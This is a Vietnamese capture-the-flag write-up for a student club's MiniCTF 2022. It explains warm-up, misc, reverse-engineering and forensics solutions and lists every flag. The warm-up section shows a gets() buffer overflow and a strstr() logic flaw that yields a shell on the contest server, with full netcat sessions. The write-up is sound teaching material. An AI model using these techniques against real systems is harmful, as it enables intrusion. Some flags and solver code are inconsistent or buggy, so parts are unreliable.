# MiniCTF 2022
-------------------------------------
<p>Để chào mừng tân sinh viên D22 đến với Học Viện Công Nghệ Bưu Chính Viễn Thông cũng như các bạn sinh viên khác có niềm đam mê với Cyber Security, ISP CLUB chúng mình tổ chức cuộc thi thường niên MiniCTF và đây là Write Up cho MiniCTF 2022 <p>
<img src=https://github.com/Dongkong1908/MiniCTF-2022/blob/main/Screenshot%202022-10-06%20191506.png?raw=true>

## Overview

| Title | Category | Flag | 
| :----- | :---------- | :-------------- | 
| [Discord](#Welcome-Discord) | Welcome | `ISPCTF{W3LC0ME_2_M1ni_CTF_90oDLuCK}` | 
| [Basic Forensic](#Warm-Up-Basic-Forensic) | Warm Up | `ISPCTF{7hAt_warm_up_gnys}` | 
| [What is Netcat?](#Warm-Up-What-is-Netcat) | Warm Up | `ISPCTF{Th1s_1s_n3t_c4t}` | 
| [Abcbof](#Warm-Up-abcbof) | Warm Up | `ISPCTF{B4s1c_Buff3r_0v3rFl0w}` |
| [Rock, Paper, Scissors](#Warm-Up-RPS) | Warm Up |  `ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}`  |
| [Best Avatar](#Misc-Best-Avatar) | Misc | `ISPCTF{ISP_cAptu5e_th3_F1a9}` |
| [Base64](#Misc-Base64) | Misc | `ISPCTF{H4v3_4_G00D_D4y}` |
| [New misc](#Misc-New-Misc) | Misc | `ISPCTF{BILLCIPHER}`|
| [Baby Kinzx](#RE-Baby-Kinzx) | RE | `ISPCTF{_bit_bitch_beach}` |
| [EZ RE](#RE-EZ-RE) | RE | `ISPCTF{d35cr4mbl3_tH3_cH4r4cT3r5_ff63b0}` |
| [Loop Key](#RE-Loop-Key) | RE | `ISPCTF{T01_co_kh1en_ban_vu1_12112003}` |
| [XOR](#RE-XOR) | RE | `ISPCTF{N0r_1s_s0_M4g1c}` |
| [Correct File?](#Forensics-Correct-File) | Forensics | `ISPCTF{i_am_following_you}` |
| [Japanese Food](#Forensics-Japanese-Food) | Forensics | `ISPCTF{Pe0ple_mAke_1t_complicat3d}` |
| [Love n Light](#Forensics-Love-n-Light) | Forensics | `ISPCTF{Fr0m_kA1z_w1tH_L0v3}` |
| [Where is Nemo?](#Forensics-Where-is-Nemo) | Forensics | `ISPCTF{y0u_5ave_Nem0_f15h}` |
| [Are you Wibu?](#Forensics-Are-you-Wibu) | Forensics | `ISPCTF{w1bu_n3v3r_d13_1337}` |
| [OnlyFan](#Forensics-OnlyFan) | Forensics | `ISPCTF{r0und_n_r0und_1908absc}` |
| [PHP Moon Cake](#Web-PHP-Moon-Cake)| Web | `ISPCTF{m00n_c4k3_15_t00_sw33t}` |
| [Get Out Of Here](#Web-Get-Out-Of-Here) | Web | `ISPCTF{jU5t_lnsp3ct_01012021dad}` |
| [Find Flag](#Web-Find-Flag) | Web | `ISPCTF{HAv3_Fnu_Vvlt5_W3b}` |
| [Keiichi](#Web-Keiichi) | Web | `ISPCTF{H3_1S_C0m3B4ck_Y0u_Can_find_him}` |
| [ISP Info](#Web-ISP-Info) | Web | `ISPCTF{N0w_Y0u_Kn3w_4b0ut_ISP_Y0ur_W3lC0m3}` |
| [Sqli Blind](#WEB-Sqli-Blind) | Web | `ISPCTF{Bl1nd_brut3f0rc3_01fg6}` |
| [Do you know what is Basecrack](#Crypto-Do-you-know-what-is-basecrack) | Crypto | `ISPCTF{1_you_kn0w_Base_Crack}` |
| [Caesar Knight](#Crypto-Caesar-Knight) | Crypto | `ISPCTF{h3ll0_ISP_1337}` |
| [UwU](#Crypto-UwU) | Crypto | `ISPCTF{UU_3ncode_not_UwU}` |
| [Love Song](#Crypto-Love-Song) | Crypto | `ISPCTF{HOW_CAN_YOU_FIX_IT_?}` |
| [You are noob!](#Crypto-You-are-noob) | Crypto | `ISPCTF{c4T_M3_1f_u_C4n?}` |
| [ROTTOR](#Crypto-ROTTOR) | Crypto | `ISPCTF{0h_mY_90D_y0u_931_i1}` |

# Welcome: Discord
#### Challenge

<p>Bạn đã sẵn sàng cho cuộc hành trình trước mắt chưaaaaaaa???<p>

<p>Tham gia kênh Discord của cuộc thi để giao lưu, trao đổi cùng các bạn thi khác và liên hệ với BTC khi có trục trặc xảy ra nhé!! Keep calm and Capture The Flag :><p>

Flag bên trong: https://discord.gg/ZSZqyYabbG

#### Solution

Flag có thể lấy trong [link](https://discord.gg/ZSZqyYabbG)

Flag: `ISPCTF{W3LC0ME_2_M1ni_CTF_90oDLuCK}`

# Warm Up: Basic Forensic
#### Challenge
Tập hợp để đi đánh boss thôi nàoo!

[circle.svg](https://github.com/Dongkong1908/MiniCTF-2022/blob/main/Basic%20Forensic/circle.svg)

#### Solution

<p>Tải file svg về và mở lên, không thấy gì bất thường cả. Ta thử inspect lên thấy các đoạn < tspan > có liên kết với nhau. Ghép chúng lại ta ra được flag<p>
<p> Hoặc chúng ta có thể mở file dưới dạng text ( mở bằng notepad ) cũng có thể xem được giá trị được ghi trong file .svg đó. <p>


<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Basic%20Forensic/basic_forensics.png>

Flag: `ISPCTF{7hAt_warm_up_gnys}`


# Warm Up: What is Netcat?


#### Challenge

Can you connect the netcat ? 
>nc 174.138.21.217 3136

#### Solution
Chúng ta sẽ kết nối vào `netcat` ngay lập tức flag sẽ hiện ra.

```
halston in ~ λ nc 174.138.21.217 3136
                              NETCAT
                            /\_____/\
                           /  o   o  \
                          ( ==  ^  == )
                          ))         (
                          (           )
                         ( (  )   (  ) )
                        (__(__)___(__)__)

Here your flag: ISPCTF{Th1s_1s_n3t_c4t}
```

Flag: `ISPCTF{Th1s_1s_n3t_c4t}`

# Warm Up: abcbof

#### Challenge
>nc 174.138.21.217 3137

#### Solution
Khi tải source code về ta có thể nhìn thấy có lỗi tại gets() vì khi nhập vào sẽ không kiểm soát số lượng kí tự được nhập
```
int main(){   
    long long money = 0;
    puts("==========================Game Bài Đoán Số Uy Tín Đổi Thưởng==========================");
    puts("| 1. Chơi Game   |  2. Hướng Dẫn   |   3. Đổi Flag   |  4. Thoát Game |  5. Tài Khoản |");
    puts("======================================================================================");
    puts("Hãy nhập tên người chơi:");
    char name[30];
    gets(name);
```
Vì vậy khi ta nhập 1 dãy thật dài thì chương trình sẽ ghi đè lên biến money qua lệnh `gets()` và làm thay đổi giá trị của biến khi nhìn vào stack.
```
|        .  .  .  .                              
|  +-------------------+                                   
S  |       money       |
t  +-------------------+
a  |      name[30]     |  
c  +-------------------+
k  |        ...        |
|  +-------------------+
```
Vì vậy ta tiến hành nhập vào biến `name` để có thể khiến biến `money` bị thay đổi giá trị từ đó ta có thể có 1 số tiền lớn và mua flag.
```
halston in ~ λ nc 174.138.21.217 3137



                                         I
                                      II   II
                                   II         II
                                ,I               II
                              I,       IIIIII       II
                           II       IIIIIIIIIIII       II
                        II       IIIIIIIIIIIIIIIIII#      II
                     II        IIIIIIIIIIIIIIIIIIIIIII       II
                  II        IIIIIIIIIII       IIIIIIII  II      II
           IIIIII            IIIIIII            IIIIII  IIIII      II
           IIIII        II    IIIIIII           IIIIII  IIIIIIII      II.
            #I      I   IIII    IIIIIII         IIIIII  IIIIIIIIIII     I
                 IIIII  IIIII    IIIIIIIII     .IIIIII  IIII   IIIII    I
        IIIII  IIIIIII   IIIIII    IIIIIIIII     IIIII  IIII    IIII    I
        IIIII  #IIIIII   IIIIII       IIIIIIIII      I  IIII   IIII    I
           I    IIIIIII   IIIIII  I     IIIIIIIIIII     IIIII# IIII    I
           I     IIIIII   IIIIIII  II      IIIIIIIIII  IIIIIIIIIII    II
            I    IIIIIII   IIIIIII  III#     IIIIIII   IIIIIIIIIII    I
            I     IIIIIII   IIIIIII  IIIII  IIIIIIII  IIIIIIIIIII    I
             I     IIIIIII   IIIIIII  IIII IIIIIIII   IIIIIIIIII    II
              I     IIIIIII   IIIIIII  II IIIIIIII#  IIIIIIIIII     I
               I     IIIIIII   IIIIIIII  IIIIIIIII  *IIIIII II     I
                I     IIIIIII   IIIIIIIIIIIIIIIII   IIIIII II     I
                 I     IIIIIII   IIIIIIIIIIIIIII   IIIII* II    #I
                  I      IIIIII    IIIIIIIIIIII   IIIII  I     II
                   I.     IIIIIII    IIIIIIIII   IIIII II     I
                     I      IIIIIII   IIIIII   IIIIII I      I
                      II      IIIIII    III   IIIII        I
                        II      IIIIII      IIIIII       II
                          II      IIIIII   IIIII       II
                            II      IIIIIIIIII       II
                               II                  I
                                 III            II
                                    #II     III
                                        III


Hãy nhập tên người chơi: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
==========================Game Bài Đoán Số Uy Tín Đổi Thưởng==========================
| 1. Chơi Game   |  2. Hướng Dẫn   |   3. Đổi Flag   |  4. Tài Khoản | 5. Thoát Game |
======================================================================================

Hello �aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, chào mừng bạn đến với Game Bài Uy Tín Top 1 Việt Nam !!!
Nhập lựa chọn của bạn:
4

Tài khoản của bạn có 7016996765293437281 $
```
Từ đó ta có thể mua flag
```
Nhập lựa chọn của bạn:
3

Tài khoản của bạn có 7016996765293437281 $
=====================FLAG=======================
|Bạn có muốn mua FLAG với giá 1 000 000 000 $  |
|----------------------------------------------|
|         1. YES      |         2. NO          |
================================================
Lựa chọn của bạn :
1


Chúc mừng bạn đã chiến thắng
Đây là Flag của bạn:
ISPCTF{B4s1c_Buff3r_0v3rFl0w}
```

Flag: `ISPCTF{B4s1c_Buff3r_0v3rFl0w}`


# Warm Up: RPS

#### Challenge

>nc 174.138.21.217 3138

#### Solution
Đọc source code ta có thấy chương trình sử dụng `if (strstr(player_turn, loses[computer_turn]))` hàm strstr() để kiểm tra chuỗi người dùng nhập vào `player_turn` có 
trong chuỗi `loses[computer_turn]` máy tính thua không.
Nếu có sẽ trả về `true` từ đó ta có 1 lần chiến thắng.
```
if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
```
Tận dụng lỗi này ta sẽ nhập `{"rock", "paper", "scissors"}` 6 lần để có thể chiến thắng.
```
 if (wins >= 6) {
        puts("Congrats!!!");
        system("/bin/sh");
	
      }
```
Chúng ta sẽ connect đến `netcat` để thực hiện 6 lần nhập sau đó khi chương trình gọi `/bin/sh` ta sẽ lấy được `shell`.
```
halston in ~ λ nc 174.138.21.217 3138
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: scissors
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: paper
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1


Please make your selection (rock/paper/scissors):
(rock/paper/scissors)
You played: (rock/paper/scissors)
The computer played: scissors
You win! Play again?
Congrats!!!
ls
bin
chall
dev
flag.txt
ld.so
lib
lib32
lib64
libc.so.6
cat flag.xtt
cat: flag.xtt: No such file or directory
cat flag.txt
ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}
```


Flag: `ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}`

# Misc: Best Avatar
#### Challenge
Việc đầu tiên là cần tìm đồng minh, hãy nhanh chóng vào cộng đồng ISP để tìm nàoo!!
#### Solution
<p>Vào page CLB ISP- CLB An Toàn Thông Tin PTIT, mở Avatar của CLB lên để thấy flag ở phần comment<p>

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Best%20Avatar/best_avatar.png>

Flag: `ISPCTF{ISP_cAptu5e_th3_F1a9}`

# Misc: Base64

#### Challenge
 QQRR

#### Solution
Bài cho chúng ta 1 mã QR

![image](https://user-images.githubusercontent.com/91616280/197390779-a7211cb8-29c7-438b-944f-ace1c25af825.png)

Quét mã QR ra được đoạn mã base64

![image](https://user-images.githubusercontent.com/91616280/197390839-b2715d5b-48a6-40f0-b6e0-6ce8c15fbb2d.png)

Giải mã nó ta được flag 

![image](https://user-images.githubusercontent.com/91616280/197390894-1a05d988-c2be-4daa-9691-b8ab75f4a80f.png)

Flag: `ISPCTF{H4v3_4_G00D_D4y}`

# Misc: New Misc
#### Challenge
Trên hành trình giải cứu thế giới Bốp đã gặp Dipper & Mable và biết được rằng Xipan đang câu kết với Bill Tam Giác để phát tán code bẩn. Hãy giúp Dipper & Mable ngăn chặn điều đó lại!

[New_misc.zip](https://github.com/Dongkong1908/MiniCTF-2022/blob/main/New%20Misc/New_misc.zip)

#### Solution

Giải nén file ta được 1 ảnh và 1 file zip cần mật mã để mở. 

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/New%20Misc/img/New_Misc_1.png>

Từ bức ảnh có thể đoán được pass trong bức ảnh này. Tra google người trong ảnh biết được đây là thủ tướng Phạm Văn Đồng, thử pass Pham Van Dong, giải nén được file ra 2 file khác

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/New%20Misc/img/New_Misc_2.png>

Nhìn vào bức ảnh chứa mật mã, đoán được đây có thể là mật mã Bill Cypher

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/New%20Misc/img/New_Misc_4.jpg>

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/New%20Misc/img/New_Misc_3.png>

<p>Giải mật mã được flag<p>

Flag: `ISPCTF{BILLCIPHER}`

# RE: Baby Kinzx

#### Challenge

##### Source Code

```C++
#include<stdio.h>
#include<string.h>
#include<Windows.h>
int main(){
	
	puts("Pls, Enter your License : ");
	char license[]="010010010101001101010000010000110101010001000110011110110101111101100010011010010111010001011111011000100110100101110100011000110110100001011111011000100110010101100001011000110110100001111101";
	char my_license[100];
	fgets(my_license,100,stdin);
	if(strlen(my_license)==25){
		puts("[+] Checking....");
		Sleep(3000);
		int l = (int)strlen(license);
		unsigned char flag[24] = {};
		
		for(int i=0;i<l;i+=8){
			for(int j=i;j<(i+8);j++){
				int pos = (int)(i/8);
				flag[pos] <<= 1;
				flag[pos] += license[j] - 0x30;
			}
		}
		flag[24]=0;
		if(memcmp(flag,my_license,24)==0){
			puts("Cracked!");
		}else{
			puts("Are you hacker ?");
		}
	}else{
		puts("Invalid License!");
	}
}
```

#### Solution

- Theo ta thấy để nhận được `flag=ISPCTF{}` thì my_license và flag phải bằng nhau và có độ dài 24 kí tự, thuật toán bài này là biến dãy chuỗi nhị phân sang dãy số nhị phân.
>## Thuật toán :
```C++
for(int i=0;i<l;i+=8)
{
	for(int j=i;j<(i+8);j++)
    {
		int pos = (int)(i/8);
		flag[pos] <<= 1;
		flag[pos] += license[j] - 0x30;
	}
}
```
- Bản chất ở đây nõ sẽ lấy 8 bit lại thành một mảng flag[ i ]. Vậy sau khi hiểu rõ về thuật toán chúng ta có thể coppy đoạn chuỗi lên tool [kt.gy](https://kt.gy/tools.html#conv/) để ra

Flag: `ISPCTF{_bit_bitch_beach}`

# RE: EZ RE #
#### Challenge
##### Source Code 

```C
#include <stdio.h>
#include <string.h>
int main()
{
    printf("-------------------CUOC_BAT_BAT_DAU-----------------------------\n");
    printf("Input Flags: ");
    char flag[33] = {};
    puts(flag);
    fgets(flag, sizeof(flag), stdin);
    if (strlen(flag) == 32 &&
        flag[0] == 'd' &&
        flag[29] == '3' &&
        flag[4] == 'r' &&
        flag[2] == '5' &&
        flag[23] == 'r' &&
        flag[3] == 'c' &&
        flag[17] == '4' &&
        flag[1] == '3' &&
        flag[7] == 'b' &&
        flag[10] == '_' &&
        flag[5] == '4' &&
        flag[9] == '3' &&
        flag[11] == 't' &&
        flag[15] == 'c' &&
        flag[8] == 'l' &&
        flag[12] == 'H' &&
        flag[20] == 'c' &&
        flag[14] == '_' &&
        flag[6] == 'm' &&
        flag[24] == '5' &&
        flag[18] == 'r' &&
        flag[13] == '3' &&
        flag[19] == '4' &&
        flag[21] == 'T' &&
        flag[16] == 'H' &&
        flag[27] == 'f' &&
        flag[30] == 'b' &&
        flag[25] == '_' &&
        flag[22] == '3' &&
        flag[28] == '6' &&
        flag[26] == 'f' && 
        flag[31] == '0')
    {
        printf("ISPCTF{");
        printf("%s", flag);
        printf("}");
    }
    else
        printf("Incorrect!!!!");
}
```

#### Solution

- Ta thấy đề cho là một mảng flag có độ dài len(flag) = 32 chưa được sắp xếp vậy ý tưởng bài này là mình hãy chạy sắp xếp và chạy code ra flag như sau :

```C++
#include <iostream>

using namespace std;

int main() {
char flag[200];
string s="ISPCTF{";
flag[0] = 'd'; 
flag[29] = '3' ;
flag[4] = 'r' ;
flag[2] = '5' ;
flag[23] = 'r' ;
flag[3] = 'c' ;
flag[17] = '4';
flag[1] = '3' ;
flag[7] = 'b' ;
flag[10] = '_' ;
flag[5] = '4' ;
flag[9] = '3' ;
flag[11] = 't' ;
flag[15] = 'c' ;
flag[8] = 'l' ;
flag[12] = 'H' ;
flag[20] = 'c' ;
flag[14] = '_' ;
flag[6] = 'm' ;
flag[24] = '5' ;
flag[18] = 'r' ;
flag[13] = '3' ;
flag[19] = '4' ;
flag[21] = 'T' ;
flag[16] = 'H' ;
flag[27] = 'f' ;
flag[30] = 'b' ;
flag[25] = '_' ;
flag[22] = '3' ;
flag[28] = '6' ;
flag[26] = 'f'  ;
flag[31] = '0';
for (int i=0;i<=31;i++)
    s+=flag[i];
s+="}";
cout<<s;
    return 0;
}
//Flag=ISPCTF{d35cr4mbl3_tH3_cH4r4cT3r5_ff63b0}
```
Flag: `ISPCTF{d35cr4mbl3_tH3_cH4r4cT3r5_ff63b0}`

# RE: Loop Key 
#### Challenge
##### Source Code 

```C++
#include <iostream>
using namespace std;
int check_flag(int data[])
{
    int a[] = {
        73,167,324,545,1360,2265,7908,133,160,277,860,1705,3696,
        6249,303,433,452,1097,2084,3401,6672,538,704,909,1520,2497,
        2244,6809,833,941,1096,1353,1824,2625,4228,1276,1546};
    for (int i = 0; i < 37; i++)
    {
        if (data[i] != a[i])
            return 0;
    }
    return 1;
}
int s_203_key(string data)
{
    int src[100];
    for (int i = 0; i < data.length(); i++)
    {
        src[i] = (((int)data[i] << ((char)i % 7)) + i * i);
    }
    check_flag(src);
}
int main()
{
    string flag;
    cout << "_______________BAT_DAU_______________" << endl;
    cout << "Inputflag : ";
    cin >> flag;
    if (s_203_key(flag) == 1)
        cout << "correct!!!";
    else
        cout << "incorrect!!!";
}
```
#### Solution

- Theo như ta thấy để được in ra correct!!! thì sau khi encrypt input flag phải bằng với các phần tử mảng a trong hàm `check_flag()` . Vậy trước hết mình phải hiểu về thuật toán của hàm `s_203_key()` .

- Ta thấy thuật toán ở đây tác giả dùng phép dịch bit sang trái sau đó cộng thêm phần tử i * i để encrypt input mình nhập vào rồi so sánh với data `mảng a`. Nếu bằng với `mảng a` thì điều đó có nghĩa input mình nhập vào là flag. Từ đó, chúng ta hãy dùng data `mảng a` để decrypt bằng phép trừ i * i và say đó dịch bit sang phải .

```C++
#include <iostream>
using namespace std;

int main(){
   int a[] = {
    73,167,324,545,1360,2265,7908,133,160,277,860,1705,3696,
    6249,303,433,452,1097,2084,3401,6672,538,704,909,1520,2497,
    2244,6809,833,941,1096,1353,1824,2625,4228,1276,1546};
    int flag[36];
    int result[36];
    for (int i = 0; i< 37; i++){
       flag[i] = a[i] - i*i;
    }
    for (int i =0; i < 37; i++){
        result[i] =  flag[i] >>  ((char)i %7);
        printf("%c", result[i]);
    }
}
//flag=ISPCTF{T01_co_kh1en_ban_vu1_12112003}
```
Flag: `ISPCTF{T01_co_kh1en_ban_vu1_12112003}`

# RE: XOR
#### Challenge

##### Source Code

```C++
#include <stdio.h>
#include <string.h>

char LAW(char a, char b) {
    return !(a | b); 
}
char LOST(char a) {
    return LAW(a, a); // luôn in ra 1
}
char END(char a, char b) {
    return LOST(LAW(a, b));
}
char OO(char a, char b) {
    return LOST(END(LOST(a), LOST(b)));
}
char ISPCLUB(char a, char b) {
    return END(OO(a, LOST(b)), OO(LOST(a), b));
}
int main() {
    unsigned char input[15];
    unsigned char cipher[15] = { 0xe7,0x99,0xdb,0xf6,0x98,0xda,0xf6,0xda,0x99,0xf6,0xe4,0x9d,0xce,0x98,0xca };
    unsigned char your_cipher[15];
    char key[] = { 1,0,0,1,0,1,0,1 };
    printf("Enter Flag : ");
    fgets((char*)input, sizeof(input) + 1, stdin);

    for (char i = 0; i < sizeof(input); i++) {
        char tmp[8] = { 0,0,0,0,0,0,0,0 };
        unsigned char result = 0;

        for (char b = 0; b < 8; b++) {
            char bit_1 = (input[i] >> b) & 1;
            char bit_2 = key[b];
            char rs = ISPCLUB(bit_1, bit_2);
            tmp[b] = rs;
        }
        for (char k = 7; k >= 0; k--) {
            result = (result << 1) + tmp[k];
        }
        your_cipher[i] = result;
    }
    for (char i = 0; i < 15; i++) {
        if (your_cipher[i] != cipher[i]) {
            printf("Incorrect!");
            return 1;
        }
    }
    printf("GOOD! HERE IS YOUR FLAG ISPCTF{%s}", input);
}
```

#### Solution

- Sau khi đọc đề ta thấy để ra được flag thì sau khi encrypt `input` đc `your_cipher` phải bằng với `cipher` .

```C++

    for (char i = 0; i < sizeof(input); i++) {
        char tmp[8] = { 0,0,0,0,0,0,0,0 };
        unsigned char result = 0;

        for (char b = 0; b < 8; b++) {
            char bit_1 = (input[i] >> b) & 1;
            char bit_2 = key[b];
            char rs = ISPCLUB(bit_1, bit_2);
            tmp[b] = rs;
        }
        for (char k = 7; k >= 0; k--) {
            result = (result << 1) + tmp[k];
        }
        your_cipher[i] = result;
    }
```
- Thuật toán ở đây nó sẽ lấy từng kí tự mình nhập vào để encrypt
từng kí tự với vòng for đầu tiên nó sẽ liên quan 8 bit của 1 kí tự :
    +  `char bit_1 = (input[i] >> b) & 1;` ở bit_1 cho ta biết chức năng của nó dịch bit sang phải và `&1` để lấy từng bit từ phải sang trái.
    + `bit_2` để lấy từng `value array key`.
    + Bản chất của hàm `ISPCLUB()` là lấy bit_1 XOR  bit_2. Vậy tại sao tôi lại biết điều đó chúng ta hãy dùng tool rút gọn biểu thức logic : [WolframAlpha](https://www.wolframalpha.com/input?i=simplify+%28X+%7C%7C+Y%29+%7C%7C+X+%26%26+Y+%7C%7C+Y&fbclid=IwAR2rgIOZtSEbD7cuylLdqP6IrTIRA8A0waK4dJZ-atbSOfM9MG1M8vLvCaE)
    ```C++
    char ISPCLUB(char a, char b) {
    return END(OO(a, LOST(b)), OO(LOST(a), b));
    ```
    +  Kết quả của hàm này sẽ return Bit_1 `XOR` Bit_2
    ```C++
    for (char k = 7; k >= 0; k--) {
            result = (result << 1) + tmp[k];
        }
    ```
    + Đến với hàm này có tác dụng ghép 8 bit lại sau khi tách ra để encrypt.

##### SOURCE SCRIPT

```C++
#include <iostream>
using namespace std;
int main()
{
    int cipher[33] = {0xe7, 0x99, 0xdb, 0xf6, 0x98, 0xda, 0xf6, 0xda, 0x99, 0xf6, 0xe4, 0x9d, 0xce, 0x98, 0xca};
    for (int i = 0; i < 15; i++)
    {
        cout << char(cipher[i] ^ 0xa9); //0xa9 là dạng hex của dãy key[]={1,0,0,1,0,1,0,1} mình sẽ đảo ngược chuỗi key ta sẽ đc dạng hex 0xa9
        
    }
}
//flag=ISPCTF{N0r_1s_s0_M4g1c}
```
![img](https://github.com/kienzx203/Write_upCTF/blob/main/image/Screenshot%202022-10-20%20112646.png)

Flag: `ISPCTF{N0r_1s_s0_M4g1c}`

# Forensics: Correct File?
#### Challenge
Có tiếng nhạc văng vẳng đâu đây, liệu có phải là tín hiệu?

[file.zip](https://github.com/Dongkong1908/MiniCTF-2022/blob/main/Correct%20File/file.zip?raw=true)

#### Solution

Giải nén file trên được 1 file mp3. Nghe ra là 1 đoạn nhạc. Vì đầu bài là correct file nên ta thử chuyển sang mp4. Mở lên thấy luôn flag đang chạy

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Correct%20File/correct_file.png>

Flag: `ISPCTF{i_am_following_you}`

# Forensics: Japanese Food

#### Challenge

Xipan là một kẻ nghiện đồ ăn Nhật đặc biệt là món sashimi nên đã trang trí mọi thứ trong phòng thành hình món sashimi. Thậm chí, hắn còn ép ca sĩ Tree Poo sáng tác riêng cho hắn một MV liên quan đến món ăn này để xem lúc rảnh rỗi. Biết được điều đó, Bốp quyết định cài cắm mã độc vào MV, khi Xipan mở lên sẽ làm cho máy tính của hắn sẽ tự hủy. Hãy giúp bốp tìm vị trí đặt mã độc để tránh tên Xipan tìm thấy nhé !

[Video](https://youtu.be/N6pjpsWuwjQ)

#### Solution

Bài này yêu cầu ta tìm flag trong video.

Khi đó trên màn hình sẽ xuất hiện những mảnh flag như:

<img src=https://github.com/ispclub/WUMiniCTF-2022/blob/main/Japanese%20Food/mini2022.png>

Nhưng đó là fake flag, xem đến cuối sẽ xuất hiện một mã QR, scan nó và nhận được flag 

<img src=https://github.com/ispclub/WUMiniCTF-2022/blob/main/Japanese%20Food/mini2022qr.png>

Flag: `ISPCTF{Pe0ple_mAke_1t_complicat3d}` 

# Forensics: Love n Light 
#### Challenge

<p>Ánh sáng và bóng tối,Bốp đã có thể đối đầu trực diện với Xipan<p>

[blind.png]()

#### Solution

- Đề cho ta một bức ảnh xanh không có gì hết 
- Đọc lại đề bài ta thấy đề cập đến 'light' và ánh sáng => ý tưởng của tác giả có thể là chỉnh độ sáng của ảnh
- Ta mở chỉnh sửa ảnh lên là tăng độ sáng thấy được flag 
![img](https://github.com/kienzx203/Write_upCTF/blob/main/image/WU.png)

 Flag: `ISPCTF{From_kA1z_w1tH_LOv3}`

# Forensics: Where is Nemo?
#### Challenge
Nemuuu là chú pet robot được Bốp rất yêu quý. Không may chú đã bị dính code bẩn và chạy lung tung không nhớ được về. Hãy giúp Bốp mang Nemu về nhé, đừng bỏ cuộc!!! Rescue Nemooo :<

[Where_is_Nemo.jpg](https://github.com/Dongkong1908/MiniCTF-2022/blob/main/Where%20is%20Nemo/Where_is_Nemo.zip?raw=true)

#### Solution

Tải ảnh về, mở lên không có gì ẩn trong ảnh cả, có thể file ẩn bên trong là dạng file khác, thử đổi tên ảnh từ đuôi .jpg thành đuôi .zip

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Where%20is%20Nemo/img/where_nemo_1.png>

Giải nén file trên lại được 1 cái ảnh khác 

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Where%20is%20Nemo/img/where_nemo_2.png>

Cứ đổi tên rồi lại giải nén cho đến khi gặp được file nemo.txt

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Where%20is%20Nemo/img/where_nemo_3.png>

Mở thử lên, ở đoạn đầu thấy được dạng đúng của file là dạng jfif tương ứng với đuôi file là .jpg hoặc .jpeg. 

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Where%20is%20Nemo/img/where_nemo_4.png>

Mở lên và lấy được flag 

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Where%20is%20Nemo/img/nemo.jpg height=600px >

Flag: `ISPCTF{y0u_5ave_Nem0_f15h}`

# Forensics: Are you Wibu?  
#### Challenge

Tại sao lại có bức ảnh này ở đây thế nhỉ ? Có điều gì sai chăng

[Are_you_wibu.zip](https://github.com/Dongkong1908/MiniCTF-2022/blob/main/Are%20you%20Wibu/Are_u_wibu.zip?raw=true)

#### Solution

Tải file về không mở được, thử đổi đuôi tên thành .jpg , mở lên được file như thế này 

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Are%20you%20Wibu/wibu_1.png height=600>

<p> Nhìn qua ảnh, biết được ảnh bị chồng/ dồn pixel theo chiều ngang, nên phải sửa độ phân giải của ảnh. <p>
<p> Trước hết, cho ảnh vào hxd hoặc hexed.it để biết được đúng dạng file của ảnh (png, jpg hay jpeg,....) và biết được dạng đúng của nó là jpg hay chính là jpeg<p>
<p> Xem propertises/ detail của ảnh, biết được chiều rộng của ảnh hiện tại đang là 642px <p>

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Are%20you%20Wibu/wibu_2.png height=500>


Đổi 642 sang Hex thấy được giá trị của nó là 02 82. Mở ảnh bằng Hxd hoặc Hexed.it để tìm vị trí byte chứa size ảnh (thường thì vị trí sẽ ở ngay những byte đầu tiên)

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Are%20you%20Wibu/wibu_5.png weight=500px >

Và ở ngay byte FF C0, có được giá trị độ rộng của ảnh ở gần đó 

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Are%20you%20Wibu/wibu_3.png>

Tăng độ rộng liên tục (do ảnh bị chồng pixel) hoặc sử dụng công thức trong [wiki](https://en.wikipedia.org/wiki/JPEG) thì biết được giá trị đúng của nó là 07 82 tương ứng 1922px, mở ảnh là thấy flag

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Are%20you%20Wibu/wibu_4.png>

